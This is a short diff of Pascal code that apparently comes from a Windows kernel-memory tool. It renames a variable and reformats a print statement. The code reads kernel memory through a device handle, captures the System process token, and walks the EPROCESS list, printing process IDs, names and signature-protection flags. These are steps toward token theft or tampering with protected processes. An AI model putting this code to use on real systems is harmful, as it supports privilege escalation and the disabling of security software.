@@ -97,7 +97,7 @@ device:thandle=thandle(-1);
          PsInitialSystemProcessOffset:DWORD64=0;
          PsInitialSystemProcessAddress:DWORD64=0;
          UniqueProcessId:dword64=0;
-         ActiveProcessLinks:dword64=0;
+         SystemProcessFlink:dword64=0;
          value:dword64=0;
          next:dword64=0;
          imagefilename:string='';
@@ -125,20 +125,21 @@ WriteLn ('KernelBaseAddr:'+inttohex(NtoskrnlBaseAddress,sizeof(nativeuint)));
     //clear low 4 bits of _EX_FAST_REF structure
     SystemProcessToken := ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.Token) and not 15;
     WriteLn('UniqueProcessId:'+inttohex(UniqueProcessId,sizeof(nativeuint))+';'+imagefilename);
-    ActiveProcessLinks:= ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.EprocessNext);
-    WriteLn('ActiveProcessLinks:'+inttohex(ActiveProcessLinks,sizeof(nativeuint)));
+    SystemProcessFlink:= ReadMemoryDWORD64(Device, PsInitialSystemProcessAddress + offsets.EprocessNext);
+    WriteLn('ActiveProcessLinks:'+inttohex(SystemProcessFlink,sizeof(nativeuint)));
     writeln('*************************');
-    next:=ActiveProcessLinks;  //first LIST_ENTRY
+    next:=SystemProcessFlink;  //first LIST_ENTRY
     if UniqueProcessId=4 then //safety check
     begin
-    while value<>ActiveProcessLinks do
+    while value<>SystemProcessFlink do
     begin
           UniqueProcessId:=ReadMemoryDWORD64(Device, next-8);
           imagefilename:=ReadMemory16bytes(Device, next-offsets.EprocessNext+$450);
           protection :=ReadMemoryDword(Device, next-offsets.EprocessNext+offsets.SignatureProtect);
           if (UniqueProcessId<4) or (UniqueProcessId>$FFFF) then break;
 
-          if action=0 then writeln(inttohex(next-offsets.EprocessNext,sizeof(nativeuint))+';'+inttostr(UniqueProcessId)+';'+imagefilename+';'+inttohex(protection,sizeof(dword)) );
+          if action=0
+             then writeln(inttohex(next-offsets.EprocessNext,sizeof(nativeuint))+';'+inttostr(UniqueProcessId)+';'+imagefilename+';'+inttohex(protection,sizeof(dword)) );
 
           //WriteLn('flags :'+inttohex(ReadMemorydword(Device, next-$2E8+$300),4));
           //WriteLn('flags2 :'+inttohex(ReadMemorydword(Device, next-$2E8+$304),4));
